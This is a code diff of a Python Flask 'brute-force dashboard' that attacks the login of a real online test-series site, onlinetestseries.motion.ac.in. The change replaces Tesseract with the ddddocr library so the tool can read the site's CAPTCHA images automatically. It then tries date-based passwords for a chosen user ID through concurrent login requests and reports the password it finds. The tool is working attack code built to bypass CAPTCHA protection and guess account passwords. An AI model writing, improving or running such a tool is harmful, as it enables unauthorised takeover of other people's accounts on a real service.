@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Motion OTS Brute‑Force Dashboard – Fixed with Timeouts & Detailed Logging
+Motion OTS Brute‑Force Dashboard – Using ddddocr for CAPTCHA recognition
 Author: Potato
 """
 
@@ -16,38 +16,46 @@ import aiohttp
 from bs4 import BeautifulSoup
 import re
 from datetime import datetime, timedelta
-from PIL import Image
-from io import BytesIO
 import sqlite3
 import traceback
 
 from flask import Flask, render_template_string, request, jsonify, g
 
-# ---------- OCR SETUP (Tesseract) ----------
+# ---------- OCR SETUP (ddddocr) ----------
 try:
-    import pytesseract
-    pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
+    import ddddocr
+    # Initialize the OCR engine once – reuse it for all requests
+    ocr = ddddocr.DdddOcr(ocr=True, det=False)  # Enable OCR, disable detection
     OCR_OK = True
+    print("✅ ddddocr initialized successfully")
 except ImportError:
     OCR_OK = False
-    print("⚠️  pytesseract not installed. Run: pip install pytesseract")
+    print("❌ ddddocr not installed. Run: pip install ddddocr")
+    sys.exit(1)
+except Exception as e:
+    OCR_OK = False
+    print(f"❌ ddddocr initialization failed: {e}")
     sys.exit(1)
 
 def solve_captcha_image(img_bytes, log_queue=None):
-    """Use Tesseract to read CAPTCHA text. Logs any errors."""
+    """
+    Use ddddocr to read CAPTCHA text.
+    Returns the recognized text (first 6 chars) or None.
+    """
     try:
-        img = Image.open(BytesIO(img_bytes))
-        img = img.convert('L')
-        img = img.point(lambda p: 0 if p < 140 else 255, '1')
-        custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-        text = pytesseract.image_to_string(img, config=custom_config)
-        cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
-        if len(cleaned) >= 4:
-            return cleaned[:6]
+        result = ocr.classification(img_bytes)
+        if result:
+            # Keep only alphanumeric characters (CAPTCHAs are usually uppercase letters + digits)
+            cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
+            if len(cleaned) >= 4:
+                return cleaned[:6]   # Most CAPTCHAs are 4-6 chars
+            # If cleaning removed too much, use the raw result (still may be valid)
+            if len(result) >= 4:
+                return result[:6]
         return None
     except Exception as e:
         if log_queue:
-            log_queue.put_nowait(f"❌ OCR error: {str(e)}")
+            log_queue.put_nowait(f"❌ ddddocr error: {str(e)}")
         return None
 
 # ---------- Database ----------
@@ -160,7 +168,7 @@ class BruteJob:
         total = len(dates)
         log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} ({total} passwords)")
 
-        # Lower concurrency to 5 to avoid overloading
+        # Lower concurrency to avoid overloading the server
         connector = aiohttp.TCPConnector(limit=5, limit_per_host=5)
         timeout = aiohttp.ClientTimeout(total=15, connect=10)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -213,14 +221,14 @@ class BruteJob:
         async with semaphore:
             log_queue.put_nowait(f"⏳ Attempting {password}")
             try:
-                # Step 1: Fetch CAPTCHA with timeout
+                # Step 1: Fetch CAPTCHA
                 captcha = await self._fetch_captcha(session, log_queue)
                 if not captcha:
                     log_queue.put_nowait(f"⏭️ Skipping {password} – CAPTCHA not obtained.")
                     return
                 log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")
 
-                # Step 2: Login attempt with timeout
+                # Step 2: Login attempt
                 success, response = await self._try_login(session, user_id, password, captcha)
                 if success:
                     log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
@@ -241,7 +249,7 @@ class BruteJob:
                                 return
                     except Exception as e:
                         log_queue.put_nowait(f"⚠️ Retry CAPTCHA error: {e}")
-                # else: login failed (wrong password) – we don't log every failure to avoid clutter
+                # else: login failed (wrong password) – not logged to avoid clutter
             except asyncio.TimeoutError:
                 log_queue.put_nowait(f"⏰ Timeout for {password}")
             except Exception as e:
@@ -254,7 +262,6 @@ class BruteJob:
                 rand = int(time.time() * 1000) + attempt + os.getpid()
                 url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                 log_queue.put_nowait(f"📸 Fetching CAPTCHA (attempt {attempt+1})")
-                # Use a short timeout for the CAPTCHA request
                 async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     log_queue.put_nowait(f"📥 CAPTCHA response: HTTP {resp.status}")
                     if resp.status == 200:
@@ -262,13 +269,14 @@ class BruteJob:
                         if len(img_bytes) < 100:
                             log_queue.put_nowait("⚠️ CAPTCHA image too small, possibly invalid.")
                             continue
+                        # Use ddddocr (run in executor because it's CPU-bound)
                         loop = asyncio.get_running_loop()
                         captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                         if captcha:
                             log_queue.put_nowait(f"✅ CAPTCHA solved: {captcha}")
                             return captcha
                         else:
-                            log_queue.put_nowait("⚠️ OCR returned empty result")
+                            log_queue.put_nowait("⚠️ ddddocr returned empty result")
                     else:
                         log_queue.put_nowait(f"⚠️ CAPTCHA HTTP {resp.status}")
             except asyncio.TimeoutError:
@@ -306,6 +314,7 @@ class BruteJob:
                     err = soup.find("div", class_="alertmsg")
                     if err and ("CAPTCHA" in err.text or "captcha" in err.text):
                         return False, "captcha_error"
+                    # If there's an error message, we could log it, but we'll just return False
                     return False, text
                 return False, f"HTTP {resp.status}"
         except asyncio.TimeoutError:
@@ -646,14 +655,27 @@ def list_jobs():
             })
         return jsonify({'jobs': jobs_list})
 
-@app.route('/test-tesseract')
-def test_tesseract():
-    import subprocess
+# ---------- Test route for ddddocr ----------
+@app.route('/test-ocr')
+def test_ocr():
+    """Check if ddddocr is working."""
     try:
-        result = subprocess.run(['tesseract', '--version'], capture_output=True, text=True)
-        return f"✅ Tesseract OK: {result.stdout[:200]}"
+        # Create a simple test image (black square) – not meant to be recognized
+        # Just test that the engine loads
+        test_text = "TEST"
+        import PIL.Image
+        from PIL import ImageDraw, ImageFont
+        img = PIL.Image.new('RGB', (100, 30), color='white')
+        d = ImageDraw.Draw(img)
+        d.text((10, 5), "ABCD", fill='black')
+        import io
+        buf = io.BytesIO()
+        img.save(buf, format='PNG')
+        buf.seek(0)
+        result = solve_captcha_image(buf.getvalue(), None)
+        return f"✅ ddddocr test: recognized '{result}' (expected 'ABCD')"
     except Exception as e:
-        return f"❌ Tesseract ERROR: {str(e)}"
+        return f"❌ ddddocr test failed: {str(e)}"
 
 @app.teardown_appcontext
 def close_connection(exception):
